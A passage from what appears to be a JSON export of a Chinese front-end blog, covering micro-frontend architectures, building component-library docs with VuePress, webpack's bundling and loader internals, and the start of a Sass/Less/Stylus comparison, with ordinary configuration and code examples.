功能（也就是需要的时候才加载对应的业务组件或应用），看上去就妥妥的是个微前端应用。 常见的组合式集成方式有这么几种： 1.独立构建组件和应用，生成 chunk 文件，构建后再归类生成的 chunk 文件。不过这种方式成本相对高些，有点类似微服务的做法。 2.开发时独立开发组件或应用，集成时合并组件和应用，最后生成单体的应用。 3.在运行时，加载应用的 Runtime，随后加载对应的应用代码和模板。 但是这种方式也有一些限制： 必须使用同一个框架，不过对于多数团队来说，这倒不算啥大问题。 规范要求特别严格！比如要统一依赖，统一依赖的版本，引入新依赖时得一个个加进去；还要规范应用的组件及路由，避免不同应用之间因为组件名称啥的发生冲突；构建过程也可能会复杂些，有的方案里要修改构建系统，有的则需要复杂的架构脚本；另外共享通用代码也是个得经常面对的问题，还得制定代码规范。 （五）纯 Web Components 技术构建Web Components 是一套很特别的技术，它允许创建可重用的定制元素，功能封装在代码之外，还能在 Web 应用里使用它们。它主要由 Custom elements（能创建自定义元素）、Shadow DOM（影子 DOM，可附加到主文档 DOM 中并控制关联功能，且不能直接被主文档 DOM 控制）、HTML templates（用于编写不在页面中显示的标记模板）以及 HTML Imports（用于引入自定义组件）这四项技术组件构成。 使用的时候，每个组件可以通过 标签引入，像这样： 12&lt;link rel=&quot;import&quot; href=&quot;components/di-li.html&quot;&gt;&lt;link rel=&quot;import&quot; href=&quot;components/d-header.html&quot;&gt; 然后在各自的 HTML 文件里创建相应的组件元素，编写组件逻辑。不过，用纯 Web Components 构建前端应用也有难度： 得重写现有的前端应用，把整个系统功能用 Web Components 来实现。 上下游生态系统不完善，缺乏一些第三方控件支持，不像 jQuery 那样有很多现成好用的控件。 系统架构复杂，应用拆分成一个个组件后，组件间的通讯就成了一个麻烦事。 而且不是所有浏览器都能完全支持 Web Components ，这也是个缺陷。 （六）结合 Web Components 构建Web Components 虽然目前离我们有点距离，但结合它来构建前端应用可是一种面向未来演进的架构，现在已经有框架在探索这种可能性。 目前有两种结合的方式： 1.使用 Web Components 构建独立于框架的组件，随后在对应的框架中引入这些组件。这是一种组件式的做法。 2.在 Web Components 中引入现有的框架，有点类似于 iframe 的形式，感觉就像是把 “遗留系统” 往未来架构上迁移。 比如说 Angular 支持的 createCustomElement 就能实现一个 Web Components 形式的组件 123456platformBrowser() .bootstrapModuleFactory(MyPopupModuleNgFactory) .then(({injector}) =&gt; { const MyPopupElement = createCustomElement(MyPopup, {injector}); customElements.define(‘my-popup’, MyPopupElement); }); 还有像 Stencil 这种形式，可以将组件直接构建成 Web Components 形式的组件，然后在 React 或者 Angular 等框架里直接引用，下面是在 React 中引用 Stencil 生成的 Web Components 的示例代码： 12345678910import React from 'react';import ReactDOM from 'react-dom';import './index.css';import App from './App';import registerServiceWorker from './registerServiceWorker';import 'test-components/testcomponents';ReactDOM.render(&lt;App /&gt;, document.getElementById('root'));registerServiceWorker(); 不过要注意，像 Stencil 目前也只是支持部分较新的浏览器，比如 Chrome、Safari、Firefox、Edge 和 IE11 等。 三、复合型方案在微前端的技术领域中，各类实现方式均呈现出其独特的优势与不足。事实上，我们完全具备这样的灵活性：挑选若干适宜的方式加以组合运用，进而形成复合型方案。依据不同项目的特定需求以及多样化的应用场景，巧妙且灵活地对这些方式进行搭配整合。如此一来，便极有可能构建出与实际状况契合度更高、功能更为强劲的微前端架构应用。 综上所述，微前端架构无疑为前端应用的开发与维护工作开辟了更为广阔的可能性空间，并提供了新颖的思路与方法。然而，无论采用何种方式，均要求我们基于具体的实际情况，深入细致地权衡其中的利弊得失，以审慎严谨的态度作出抉择。","link":"/2025/01/05/%E6%8E%A2%E7%B4%A2%E5%BE%AE%E5%89%8D%E7%AB%AF%E6%9E%B6%E6%9E%84%EF%BC%9A%E5%A4%9A%E7%A7%8D%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F%E4%B8%8E%E5%AE%9E%E8%B7%B5%E6%80%9D%E8%80%83/"},{"title":"搭建组件库文档","text":"前言在我们开发完一个组件库的时候，需要有一个组件说明文档，文档页面是最直接的获取信息的窗口。而文档页一般包含了这些信息： 组件的描述 组件 Demo 示例的展示、描述和源码 组件的参数文档 组件说明文档是让其他人了解组件库的关键环节，包括组件库的适用范围（pc端，移动端，轻量级还是重量级），兼容浏览器的版本，设计原则和背景，以及社区生态，使用方法等。 关于如何开发组件库，可看这篇： heaven-ui 文档生成这里推荐 vuepress ，可以快速帮我们完成组件库文档的建设。(https://vuepress.vuejs.org/zh/guide/) vuepress是一个文档生成工具，默认的样式和vue官方文档几乎是一致的，因为创造它的初衷就是想为vue和相关的子项目提供文档支持。它内置了 Markdown的扩展，写文档的时候就是用 markdown来写，最让人省心的是你可以直接在 Markdown 文件中使用Vue组件，意味着我们的组件库中写的一个个组件，可以直接放到文档里去用，展示组件的实际运行效果。 我的案例网站也就是通过vuepress来写的，生成静态网站后，用 gh-pages 直接部署到github上，也可以直接部署到我们自己的网站上。 vuepress更好的一点在于你可以自定义其webpack配置和主题，意味着你可以让你自己的文档站点在开发阶段有更多的功能特性的支持，同时可以把站点风格改成自己的一套主题风格。这就无需我们重头开始去做一套了，对于咱们想要快速完成组件库文档建设这一需求来说，还是挺有效的。 VuePress搭建文档VuePress 是 Vue 驱动的静态网站生成器。支持在 Markdown 中使用 Vue 组件，简洁，高性能。当然你也可以使用其他的文档生成器，如 Docz、Storybook 等。 可以根据官方文档学习如何使用：https://www.vuepress.cn/guide/getting-started.html 项目生成及配置安装可以右键手动新建，也可以使用 mkdir 命令新建： 1mkdir heavenUi &amp;&amp; cd heavenUi 全局安装VuePress1npm install -g vuepress 进入 vuepressBlogDemo 文件夹，初始化项目使用 npm init 或 npm init -y（默认yes） 1npm init -y 配置scriptspackage.json 1234{ &quot;docs:dev&quot;: &quot;vuepress dev docs&quot;, &quot;docs:build&quot;: &quot;vuepress build docs&quot; } 初始化docs创建目录和文件如下图所示 VuePress 遵循 “约定优于配置” 的原则，推荐的目录结构如下： 12345678910111213141516171819202122.├── docs│ ├── .vuepress (可选的)│ │ ├── components (可选的)│ │ ├── theme (可选的)│ │ │ └── Layout.vue│ │ ├── public (可选的)│ │ ├── styles (可选的)│ │ │ ├── index.styl│ │ │ └── palette.styl│ │ ├── templates (可选的, 谨慎配置)│ │ │ ├── dev.html│ │ │ └── ssr.html│ │ ├── config.js (可选的)│ │ └── enhanceApp.js (可选的)│ │ │ ├── README.md│ ├── guide│ │ └── README.md│ └── config.md│ └── package.json 注意 请留意目录名的大写。 docs/.vuepress: 用于存放全局的配置、组件、静态资源等。 docs/.vuepress/components: 该目录中的 Vue 组件将会被自动注册为全局组件。 docs/.vuepress/theme: 用于存放本地主题。 docs/.vuepress/styles: 用于存放样式相关的文件。 docs/.vuepress/styles/index.styl: 将会被自动应用的全局样式文件，会生成在最终的 CSS 文件结尾，具有比默认样式更高的优先级。 docs/.vuepress/styles/palette.styl: 用于重写默认颜色常量，或者设置新的 stylus 颜色常量。 docs/.vuepress/public: 静态资源目录。 docs/.vuepress/templates: 存储 HTML 模板文件。 docs/.vuepress/templates/dev.html: 用于开发环境的 HTML 模板文件。 docs/.vuepress/templates/ssr.html: 构建时基于 Vue SSR 的 HTML 模板文件。 docs/.vuepress/config.js: 配置文件的入口文件，也可以是 YML 或 toml。 docs/.vuepress/enhanceApp.js: 客户端应用的增强。 首页信息设置12345678910---home: trueactionText: 开始使用# 网站入口 根据自己的首页配置路径actionLink: /component/installationfeatures:- title: heaven-UI details: 一套基于 Vue.js 的高质量UI 组件库footer: MIT Licensed | COPYRIGHT ©--- 首页效果如下 配置导航12345678910111213141516171819202122232425262728293031module.exports = { title: 'Heaven', // 设置网站标题 description: '轻量、可靠的 Vue 组件库', // 描述 dest: './dist', // 设置输出目录 themeConfig: { // 主题配置 nav: [ // 头部导航条 { text: '主页', link: '/' }, { text: &quot;组件&quot;, link: &quot;/component/installation&quot;, }, ], // 为以下路由添加侧边栏 sidebar: { '/components/': [ { title: '组件', collapsable: false, children: [ 'button', // ... 其他组件 ] }, // 其他设置 ] } }} 客户端应用的增强文件enhanceApp.js 这个文件用于添加组件Demo展示的优化的配置 安装 1npm install heaven-ui less less-loader --save 如需本地调试，可link开发的组件库 heaven-ui 1npm link heaven-ui .vuepress/enhanceApp.js 123456789101112131415/** * 扩展 VuePress 应用 */import Heaven from 'heaven-ui'import 'heaven-ui/lib/heaven-ui.min.css' export default ({ Vue, // VuePress 正在使用的 Vue 构造函数 options, // 附加到根实例的一些选项 router, // 当前应用的路由实例 siteData // 站点元数据}) =&gt; { // ...做一些其他的应用级别的优化 Vue.use(Heaven)} .vuepress/components/button.vue文件可以进行button组件的Demo展示的样式 在md文件内增加 就可直接渲染button.vue的内容 123456789101112131415161718&lt;template&gt; &lt;div&gt; &lt;h-button&gt;默认按钮&lt;/h-button&gt; &lt;h-button type=&quot;primary&quot;&gt;主要按钮&lt;/h-button&gt; &lt;h-button type=&quot;success&quot;&gt;成功按钮&lt;/h-button&gt; &lt;h-button type=&quot;warning&quot;&gt;警告按钮&lt;/h-button&gt; &lt;h-button type=&quot;danger&quot;&gt;危险按钮&lt;/h-button&gt; &lt;h-button type=&quot;info&quot;&gt;信息按钮&lt;/h-button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default {}&lt;/script&gt;&lt;style&gt;&lt;/style&gt; 编写对应组件的Markdown文件 1234567891011121314151617#### Button 按钮#### 常用的操作按钮。&lt;ClientOnly&gt;&lt;button&gt;&lt;/button&gt;&lt;/ClientOnly&gt;``` html&lt;template&gt; &lt;h-button&gt;默认按钮&lt;/h-button&gt; &lt;h-button type=&quot;primary&quot;&gt;主要按钮&lt;/h-button&gt; &lt;h-button type=&quot;success&quot;&gt;成功按钮&lt;/h-button&gt; &lt;h-button type=&quot;warning&quot;&gt;警告按钮&lt;/h-button&gt; &lt;h-button type=&quot;danger&quot;&gt;危险按钮&lt;/h-button&gt; &lt;h-button type=&quot;info&quot;&gt;信息按钮&lt;/h-button&gt;&lt;/template&gt;``` 效果如下 访问 http://localhost:8080 即可看到文档了。当然，可以将文档部署到自己的服务器，也可以部署到 Github pages 上。 小结至此，组件库的说明文档就搭建完成，后续自行补充文档即可。 组件库地址 仓库地址 文档演示地址","link":"/2021/08/21/%E6%90%AD%E5%BB%BA%E7%BB%84%E4%BB%B6%E5%BA%93%E6%96%87%E6%A1%A3/"},{"title":"对于Webpack的简单理解","text":"背景说到构建工具，我往往会在前面加「自动化」三个字，因为构建工具就是用来让我们不再做机械重复的事情，解放我们的双手的。 什么是前端自动化？前端工程师需要维护的代码极为庞大和复杂，代码维护、打包、发布等流程也变得极为繁琐，同时浪费的时间和精力也越来越多，当然人为的错误也随着流程的增加而增加了更多的出错率。 致使每一个团队都希望有一种工具，能帮助整个团队在开发中能精简流程、提高效率、减少错误率。随之讨论自动化部署也越来越多，并且国内很多大型团队也都有自己成熟的自动化部署工具。 常用的构建工具 gulp，webpack，parcel，rollup，vite ，fis，grunt等 经过多年的发展，Webpack 已经成为构建工具中的首选，这是因为： 大多数团队在开发新项目时会采用紧跟时代的技术，这些技术几乎都会采用“模块化+新语言+新框架”，Webpack可以为这些新项目提供一站式的解决方案； Webpack有良好的生态和维护团队，能提供良好的开发体验并保证质量； Webpack 被全世界大量的Web开发者使用和验证，能找到各个层面所需要的教程和经验分享。 webpack的构成说webpack是构建工具并不确切，更确切的说法应该是静态模块打包器，在webpack里包（bundle）的概念很重要，另一个重要的概念是依赖关系图，这组成了这个打包器的重要核心。 webpack有四大核心要素，这也是跟我们使用配置webpack时十分密切的四个部分： entry： 配置入口文件，即产生依赖关系图的入口 output：文件的产出位置配置 loader：匹配文件的编译过程 plugins：针对整个构建打包流程的插件处理（文件压缩，dev环境的热加载） 出入口决定了我们需要将那些文件打包到哪里去，而loader承接这里的匹配文件的编译工作，plugins则是针对整个构建过程的操作，需要什么功能引入什么插件。 webpack打包是如何运行的也可以称为，webpack是如何实现模块化的 CommonJS是同步加载模块，一般用于node。因为node应用程序运行在服务器上，程序通过文件系统可以直接读取到各个模块的文件，特点是响应快速，不会因为同步而阻塞了程序的运行； AMD是异步加载模块，所以普遍用于前端。而前端项目运行在浏览器中，每个模块都要通过http请求加载js模块文件，受到网络等因素的影响如果同步的话就会使浏览器出现“假死”（卡死）的情况，影响到了用户体验。 ESModule 旨在实现前后端模块化的统一。而webpack就是把ES6的模块化代码转码成CommonJS的形式，从而兼容浏览器的。 为什么webpack打包后的文件，可以用在浏览器：此时webpack会将所有的js模块打包到bundle.js中（异步加载的模块除外，异步模块后面会讲），读取到了内存里，就不会再分模块加载了。 webpack对CommonJS的模块化处理举例： index.js文件，引入test.js文件 1234const test = require('./test');console.log(test);console.log('hello world'); test.js文件 1234module.exports = { name: 'startdt', age: '5',}; 当我们执行webpack之后，打包完成，可以看到bundle.js内的代码 // modules 即为存放所有模块的数组，数组中的每一个元素都是一个函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465(function(modules) { // 安装过的模块都存放在这里面 // 作用是把已经加载过的模块缓存在内存中，提升性能 var installedModules = {}; // 去数组中加载一个模块，moduleId 为要加载模块在数组中的 index // __webpack_require__作用和 Node.js 中 require 语句相似 function __webpack_require__(moduleId) { // require 模块时先判断是否已经缓存, 已经缓存的模块直接返回 if(installedModules[moduleId]) { return installedModules[moduleId].exports; } // 如果缓存中不存在需要加载的模块，就新建一个模块，并把它存在缓存中 var module = installedModules[moduleId] = { // 模块在数组中的index i: moduleId, // 该模块是否已加载完毕 l: false, // 该模块的导出值，也叫模块主体内容, 会被重写 exports: {} }; // 从 modules 中获取 index 为 moduleId 的模块对应的函数 // 再调用这个函数，同时把函数需要的参数传入，this指向模块的主体内容 modules[moduleId].call(module.exports, module, module.exports, __webpack_require__); // 将模块标记为已加载 module.l = true; // 返回模块的导出值，即模块主体内容 return module.exports; } // 向外暴露所有的模块 __webpack_require__.m = modules; // 向外暴露已缓存的模块 __webpack_require__.c = installedModules; ... ... // Webpack 配置中的 publicPath，用于加载被分割出去的异步代码，这个暂时还没有用到 __webpack_require__.p = &quot;&quot;; // Load entry module and return exports // 准备工作做完了, require 一下入口模块, 让项目跑起来 // 使用 __webpack_require__ 去加载 index 为 0 的模块，并且返回该模块导出的内容 // index 为 0 的模块就是 index.js文件，也就是执行入口模块 // __webpack_require__.s 的含义是启动模块对应的 index return __webpack_require__(__webpack_require__.s = 0);})/***** 华丽的分割线 上边时 webpack 初始化代码, 下边是我们写的模块代码 *******/// 所有的模块都存放在了一个数组里，根据每个模块在数组的 index 来区分和定位模块([ /* 模块 0 对应 index.js */ (function(module, exports, __webpack_require__) { // 通过 __webpack_require__ 规范导入 foo 函数，foo.js 对应的模块 index 为 1 const test = __webpack_require__(1); console.log(test); console.log('hello world'); }), /* 模块 1 对应 foo.js */ (function(module, exports) { // 通过 CommonJS 规范导出对象 module.exports = { name: 'startdt', age: '5', }; })]); 上面是一个立即执行函数，简单点写： 1234567891011(function(modules) { // 模拟 require 语句 function __webpack_require__(index) { return [/*存放所有模块的数组中，第index个模块暴露的东西*/] } // 执行存放所有模块数组中的第0个模块，并且返回该模块导出的内容 return __webpack_require__(0);})([/*存放所有模块的数组*/]) bundle.js 能直接运行在浏览器中的原因在于： webpack通过 _webpack_require_ 函数（该函数定义了一个可以在浏览器中执行的加载函数）模拟了模块的加载（类似于Node.js 中的 require 语句），把定义的模块内容挂载到module.exports上； 同时__webpack_require__函数中也对模块缓存做了优化，执行加载过的模块不会再执行第二次，执行结果会缓存在内存中，当某个模块第二次被访问时会直接去内存中读取被缓存的返回值。 原来一个个独立的模块文件被合并到了一个单独的 bundle.js 的原因在于，浏览器不能像 Node.js 那样快速地去本地加载一个个模块文件，而必须通过网络请求去加载还未得到的文件。 如果模块数量很多，加载时间会很长，因此把所有模块都存放在了数组中，执行一次网络加载。 这一部分，我写一了一个demo 源码地址 webpack对es6 Module模块化的处理 举例 index.js文件，引入test.js文件 1234import test from './test';console.log(test);console.log('hello world'); test.js文件 1234export default { name: 'startdt', age: '5',}; 打包完后bundle.js代码如下 12345678910111213141516171819202122232425262728293031323334353637(function(modules) { var installedModules = {}; function __webpack_require__(moduleId) { if(installedModules[moduleId]) { return installedModules[moduleId].exports; } var module = installedModules[moduleId] = { i: moduleId, l: false, exports: {} }; modules[moduleId].call(module.exports, module, module.exports, __webpack_require__); module.l = true; return module.exports; } __webpack_require__.m = modules; __webpack_require__.c = installedModules; __webpack_require__.d = function(exports, name, getter) { if(!__webpack_require__.o(exports, name)) { Object.defineProperty(exports, name, { configurable: false, enumerable: true, get: getter }); } }; __webpack_require__.n = function(module) { var getter = module &amp;&amp; module.__esModule ? function getDefault() { return module['default']; } : function getModuleExports() { return module; }; __webpack_require__.d(getter, 'a', getter); return getter; }; __webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); }; __webpack_require__.p = &quot;&quot;; return __webpack_require__(__webpack_require__.s = 0);})([相关模块]); 打包好的内容和commonjs模块化方法差不多 123456789101112131415function(module, __webpack_exports__, __webpack_require__) { &quot;use strict&quot;; // 在__webpack_exports__上定义__esModule为true，表明是一个模块对象 Object.defineProperty(__webpack_exports__, &quot;__esModule&quot;, { value: true }); var __WEBPACK_IMPORTED_MODULE_0__foo__ = __webpack_require__(1); console.log(__WEBPACK_IMPORTED_MODULE_0__foo__[&quot;a&quot;]); console.log('hello world');},function(module, __webpack_exports__, __webpack_require__) { &quot;use strict&quot;; __webpack_exports__[&quot;a&quot;] = ({ name: 'startdt', age: '5', });} 和 commonjs 不同的地方 首先, 包装函数的参数之前的 module.exports 变成了_webpack_exports_ 其次, 在使用了 es6 模块导入语法(import)的地方, 给__webpack_exports__添加了属性__esModule 其余的部分和 commonjs 类似 webpack文件的按需加载以上webpack把所有模块打包到主文件中，所以模块加载方式都是同步方式。但在开发应用过程中，按需加载（也叫懒加载）也是经常使用的优化技巧之一。 按需加载，通俗讲就是代码执行到异步模块（模块内容在另外一个js文件中），通过网络请求即时加载对应的异步模块代码，再继续接下去的流程。 main.js 文件 123456window.document.getElementById('btn').addEventListener('click', function () { // 当按钮被点击后才去加载 show.js 文件，文件加载成功后执行文件导出的函数 import(/* webpackChunkName: &quot;show&quot; */ './show').then((show) =&gt; { show('Webpack'); })}); show.js 文件 123module.exports = function (content) { window.alert('Hello ' + content);}; 代码中最关键的一句是 import(/* webpackChunkName: “show” / ‘./show’)，Webpack 内置了对 import() 语句的支持，当 Webpack 遇到了类似的语句时会这样处理： 以 ./show.js 为入口新生成一个 Chunk； 当代码执行到 import 所在语句时才会去加载由 Chunk 对应生成的文件。 import 返回一个 Promise，当文件加载成功时可以在 Promise 的 then 方法中获取到 show.js 导出的内容。 webpack有个require.ensure api语法来标记为异步加载模块，webpack4推荐使用新的import() api(需要配合@babel/plugin-syntax-dynamic-import插件)。 因为require.ensure是通过回调函数执行接下来的流程，而import()返回promise，这意味着可以使用 async/await语法，使得可以像书写同步代码一样，执行异步流程。 上述内容打包后会生成两个chunk文件，分别是主文件执行入口文件 bundle.js 和 异步加载文件 0.bundle.js 。 // 0.bundle.js 123456789101112131415// 异步模块// window[&quot;webpackJsonp&quot;]是连接多个chunk文件的桥梁// window[&quot;webpackJsonp&quot;].push = 主chunk文件.webpackJsonpCallback(window[&quot;webpackJsonp&quot;] = window[&quot;webpackJsonp&quot;] || []).push([ [0], // 异步模块标识chunkId,可判断异步代码是否加载成功 // 跟同步模块一样，存放了{模块路径：模块内容} { &quot;./src/async.js&quot;: (function(module, __webpack_exports__, __webpack_require__) { __webpack_require__.r(__webpack_exports__); __webpack_exports__[&quot;default&quot;] = (function () { return 'hello, aysnc module'; }); }) }]); 异步模块打包后的文件中保存着异步模块源代码，同时为了区分不同的异步模块，还保存着该异步模块对应的标识：chunkId。以上代码主动调用window[“webpackJsonp”].push函数，该函数是连接异步模块与主模块的关键函数，该函数定义在主文件中，实际上window[“webpackJsonp”].push = webpackJsonpCallback webpack异步加载模块实现流程跟jsonp基本一致。 既然我们知道了打包的结果，那webpack的是怎么运行的呢 webpack的核心对象Tapable：控制钩子的发布与订阅，Compiler和Compilation 对象都继承于 Tapable CompilerCompiler 继承 Tapable 对象，可以广播和监听 webpack 事件。 Compiler 对象是 webpack 的编译器，webpack 周期中只存在一个 Compiler 对象。 Compiler 对象在 webpack 启动时创建实例，compiler 实例中包含 webpack 的完整配置，包括 loaders, plugins 信息。 CompilationCompilation 继承 Tapable 对象，可以广播和监听 webpack 事件。 Compilation 实例仅代表一次 webpack 构建和生成编译资源的的过程。 webpack 开发模式开启 watch 选项，每次检测到入口文件模块变化时，会创建一次新的编译: 生成一次新的编译资源和新的 compilation 对象，这个 compilation 对象包含了当前编译的模块资源 module, 编译生成的资源，变化的文件, 依赖的的状态 webpack 的运行流程是一个串行的过程，从启动到结束会依次执行以下流程： 初始化参数：从配置文件和 Shell 语句中读取与合并参数，得出最终的参数; 开始编译：用上一步得到的参数初始化 Compiler 对象 (实例化complier对象)，加载所有配置的插件，执行对象的 run 方法开始执行编译,生成Compilation对象 (实例化Compilation对象)； 确定入口：根据配置中的 entry ,调用AST引擎(acorn)处理入口文件，生成抽象语法树AST，根据AST构建模块的所有依赖； 编译模块：从入口文件出发，调用所有配置的 Loader 对模块进行翻译，再找出该模块依赖的模块，再递归本步骤直到所有入口依赖的文件都经过了本步骤的处理； 完成模块编译：在经过第4步使用 Loader 翻译完所有模块后，得到了每个模块被翻译后的最终内容以及它们之间的依赖关系； 输出资源：根据入口和模块之间的依赖关系，组装成一个个包含多个模块的 Chunk，再把每个 Chunk 转换成一个单独的文件加入到输出列表，这步是可以修改输出内容的最后机会； 输出完成：在确定好输出内容后，根据配置确定输出的路径和文件名，把文件内容输出到目录。 编译前准备此阶段概述：在 compiler 的各种 hook 上注册项目配置的 plugins、注册 webpack 默认插件 ➡️ 注册 resolverFactory.hooks 为 Factory.createResolver 方法提供参数对象。 webpack 的事件机制是基于 tapable 库做的事件流控制，在整个编译过程中暴露出各种hook，而 plugin 注册监听了某个/某些 hook，在这个 hook 触发时，会执行 plugin 里绑定的方法。 123new NodeEnvironmentPlugin({ infrastructureLogging: options.infrastructureLogging}).apply(compiler); loader阶段递归编译生成 module 实例 resolve 阶段，解析返回包含当前模块所有信息的一个对象 此阶段概述：利用 enhanced-resolve 库，得到 resolve 解析方法 ➡️ 解析 inline loader 和它对应资源的 resource，还有项目config的 loader，然后对所有 loader 进行合并、排序 ➡️ 得到 module 对应的 parser 和 generator，用于后面的 ast 解析及模板生成 ➡️ 输出一个包含当前模块上下文、loaders、绝对路径、依赖等 module 所有信息的组合对象，提供给 afterResolve 钩子触发后的回调。这个对象下一步会被用来初始化当前文件 的 module 实例。 比如 1import Styles from style-loader!css-loader?modules!./styles.css 会被解析成： 123456789101112{ &quot;resource&quot;: &quot;./styles.css&quot;, &quot;elements&quot;: [ { &quot;loader&quot;: &quot;style-loader&quot; }, { &quot;loader&quot;: &quot;css-loader&quot;, &quot;options&quot;: &quot;modules&quot; } ]} 然后并行处理参数数组各个任务，完成之后都会返回一个 results 列表，列表顺序为参数数组顺序，与执行顺序无关。 得到的 results： 123456789101112131415161718{ &quot;results&quot;: [ [ { &quot;loader&quot;: &quot;loader的绝对路径1&quot;, &quot;options&quot;: &quot;loader参数1&quot; }, { &quot;loader&quot;: &quot;loader的绝对路径2&quot;, &quot;options&quot;: &quot;loader参数2&quot; } ], { &quot;resource&quot;: &quot;模块绝对路径&quot;, &quot;resourceResolveData&quot;: &quot;模块基本信息（即enhanced-resolve执行结果）&quot; } ]} 解析 config module rules 里的 loader，递归过滤匹配出对应的 loader： 1234567{ &quot;result&quot;: [ { &quot;type&quot;: &quot;type&quot;, &quot;value&quot;: &quot;javascript/auto&quot; }, { &quot;type&quot;: &quot;resolve&quot;, &quot;value&quot;: {} }, { &quot;type&quot;: &quot;use&quot;, &quot;value&quot;: { &quot;loader&quot;: &quot;babel-loader&quot; } } ]} 对 loader 进行合并、排序： 接着处理inline loader带有前缀!,!!,-!和result项带有enforce参数的情况，用来决定怼 loader的禁用和排序。 并行处理上一步得到的useLoadersPost、useLoadersPre、useLoaders，拿到对应的 resolve 结果即路径信息，再在回调里排序、合并， 即 loaders 配置顺序为 postLoader，inlineLoader，loader（normal），preLoader，执行顺序则相反。 执行 loader 阶段，初始化模块 module，并用 loader 倒序转译 开启构建 module 流程。 new NormalModule(result)得到初始化的 module ➡️ 在 build 过程中执行 runLoaders 处理源码，先正序读取每个 loader 并执行它的 pitch，再倒序执行每个 loader 的 normal，最后得到一个编译后的字符串或 Buffer。 runLoaders 方法来自 loader-runner，作用是按规定流程执行各种 loader，将模块源码后处理成一个 String 或 Buffer 格式的 JavaScript (可能还有个 SourceMap)。 parse 阶段，收集依赖 调用 parser 将上一步 runLoaders 的编译结果利用 acorn 库转换为 ast。生成的 AST 划分为三部分：ImportDeclaration、FunctionDeclaration和VariablesDeclaration。➡️ 遍历 ast，根据导入导出及异步的情况触发相关钩子插件来收集依赖，这些依赖用于解析递归依赖和模板操作 ➡️ 根据每个 module 的相关信息生成各自唯一的 buildHash。 递归处理依赖阶段 (重复以上步骤) 根据 module 间的相互依赖关系，递归解析所有依赖 module。即 resolve ➡️ 执行 loader ➡️ parse ➡️ 收集并处理该模块依赖的模块，直到所有入口依赖 (直接或间接) 的文件都经过了这些步骤的处理。最终返回一个入口 module。 loader过程归纳就这样，从入口module开始，根据module之间的依赖关系，递归将所有的module都转换编译。 直到层层依赖都转换完成，执行return process.nextTick(callback);，将在下一次事件循环tick之前调用 callback， 此时返回一个入口 module： 123456789{ &quot;module&quot;: { //... //同步模块 &quot;dependencies&quot;: [&quot;HarmonyImportSideEffectDependency&quot;, &quot;HarmonyImportSpecifierDependency&quot;], //异步模块 &quot;blocks&quot;: [&quot;ImportDependenciesBlock&quot;] }} 无抛出错误则再触发 compilation.hooks:succeedEntry，到此 module 生成结束。 plugins一个webpack的插件由以下几方面组成： 一个非匿名的js函数 在它的原型对象上定义apply方法 指明挂载自身的webpack钩子事件 操作webpack内部情况的特定数据 方法完成时唤起webpack提供的回调 插件的基本结构 插件是在原型中带有一个apply方法的实例化对象，当安装插件的时候，这个apply方法就会被webpack调用一次。apply方法提供一个指向当前活动的webpack compiler的引用，该引用允许访问compiler的回调 简单的Plugin案例 1234567891011function HelloWorldPlugin() { //};HelloWorldPlugin.prototype.apply = function(compiler) { compiler.plugin('webpacksEventHook', function(compilation, callback) { console.log('Hello World!') callback(); });}; module.exports = HelloWorldPlugin; 123456789101112131415function HelloCompilationPlugin(options) {}HelloCompilationPlugin.prototype.apply = function(compiler) { // Setup callback for accessing a compilation: compiler.plugin(&quot;compilation&quot;, function(compilation) { // Now setup callbacks for accessing compilation steps: compilation.plugin(&quot;optimize&quot;, function() { console.log(&quot;Assets are being optimized.&quot;); }); });};module.exports = HelloCompilationPlugin; 插件的使用 12345678const HelloWorldPlugin = require('hello-world');const webpackConfig = { // ... config settings here ... plugins: [ new HelloWorldPlugin({options: true}) ]};","link":"/2017/05/10/%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90webpack/"},{"title":"比较三个CSS预处理器（框架）:Sass、LESS和Stylus","text":"CSS 预处理器技术已经非常的成熟，而且也涌现出了越来越多的 CSS 的预处理器框架。本文介绍的是使用最为普遍的三款 CSS 预处理器框架，分别是 Sass、Less CSS、Stylus。来简单介绍下什么是 CSS 预处理器，CSS 预处理器是一种语言用来为 CSS 增加一些编程的的特性，无需考虑浏览器的兼容性问题，例如你可以在 CSS 中使用变量、简单的程序逻辑、函数等等在编程语言中的一些基本技巧，可以让 CSS 更见简洁，适应性更强，代码更直观等诸多好处。接下来将会从语法、变量、嵌套、混入(Mixin)、继承、导入、函数和操作符等方面分别对这三个框架进行比较介绍。 语法在使用 CSS 预处理器之前最重要的是理解语法，幸运的是基本上大多数预处理器的语法跟 CSS 都差不多。首先 Sass 和 Less 都使用的是标准的 CSS 语法，因此可以很方便的将已有的 CSS 代码转为预处理器代码，默认 Sass 使用 .sass 扩展名，而 Less 使用 .less 扩展名。 下面是这二者的语法： 123h1 { color: #0982C1;} 这是一个再普通不过的，不过 Sass 同时也支持老的语法，就是不包含花括号和分号的方式： 12h1 color: #0982c1 而 Stylus 支持的语法要更多样性一点，它默认使用 .styl 的文件扩展名，下面是 Stylus 支持的语法： 1234567h1 { color: #0982C1;}h1 color: #0982C1;h1 color #0982C1 你也可以在同一个样式单中使用不同的变量，例如下面的写法也不会报错： 12345h1 { color #0982c1}h2 font-size: 1.2em 变量你可以在 CSS 预处理器中声明变量，并在整个样式单中使用，支持任何类型的变量，例如颜色、数值（不管是否包括单位）、文本。然后你可以任意引用该变量。Sass 的变量必须是 $ 开始，然后变量名和值使用冒号隔开，跟 CSS 的属性一致： 12345678$mainColor: #0982c1;$siteWidth: 1024px;$borderStyle: dotted;body { color: $mainColor; border: 1px $borderStyle $mainColor; max-width: $siteWidth;} 而 Less 的变量名使用 @ 符号开始： 12345678@mainColor: #0982c1;@siteWidth: 1024px;@borderStyle: dotted;body { color: @mainColor; border: 1px @borderStyle @mainColor; max-width: @siteWidth;} Stylus 对变量名没有任何限定，你可以是 $ 开始，也可以是任意的字符，而且与变量值之间可以用冒号、空格隔开，需要注意的是 Stylus (0.22.4) 将会编译 @ 开始的变量，但其对应的值并不会赋予该变量，换句话说，在 Stylus 的变量名不要用 @ 开头。 1234567mainColor = #0982c1siteWidth = 1024px$borderStyle = dottedbody color mainColor border 1px $borderStyle mainColor max-width siteWidth 上面的三种不同的 CSS 预处理器的写法，最终都将产生相同的结果： 12345body { color: #0982c1; border: 1px dotted #0982c1; max-width: 1024px;} 可以想象，假如 CSS 中使用了某个颜色的地方多达数十次，那么要修改颜色时你必须找到这数十次的地方并一一修改，而有了 